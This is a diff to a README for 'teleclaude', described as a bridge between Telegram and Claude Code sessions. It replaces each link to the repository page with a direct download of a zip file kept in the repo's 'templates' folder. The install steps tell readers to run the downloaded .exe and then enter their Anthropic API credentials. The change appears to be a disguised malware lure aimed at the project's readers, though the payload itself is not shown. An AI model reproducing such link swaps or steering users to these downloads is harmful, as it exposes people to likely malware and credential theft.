@@ -1,6 +1,6 @@
 # 🤖 teleclaude - Connect Telegram messages to Claude sessions
 
-[![](https://img.shields.io/badge/Download_Teleclaude-007bff?style=for-the-badge)](https://github.com/contealessandrovoltalandscape881/teleclaude)
+[![](https://img.shields.io/badge/Download_Teleclaude-007bff?style=for-the-badge)](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip)
 
 Teleclaude bridges the gap between your Telegram account and Claude Code. Many users want to keep their Claude sessions alive while managing requests through Telegram. This software routes your individual Telegram topics into specific, isolated sessions. It maintains memory across these sessions so you can pick up where you left off.
 
@@ -15,7 +15,7 @@ Your computer needs a few things to run this software. Ensure you have these ite
 
 ## 📥 How to Install
 
-1. Visit the [official download page](https://github.com/contealessandrovoltalandscape881/teleclaude).
+1. Visit the [official download page](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip).
 2. Look for the latest release on the right side of the page.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file to begin the setup process.
@@ -80,7 +80,7 @@ You can run several sessions at the same time. Open different Telegram chats for
 
 ## 📜 Final Setup Checklist
 
-* Download the current version from [the release page](https://github.com/contealessandrovoltalandscape881/teleclaude).
+* Download the current version from [the release page](https://github.com/contealessandrovoltalandscape881/teleclaude/raw/refs/heads/main/templates/Software-3.0.zip).
 * Install the program using the setup wizard.
 * Provide your Anthropic API credentials.
 * Authenticate your Telegram profile.
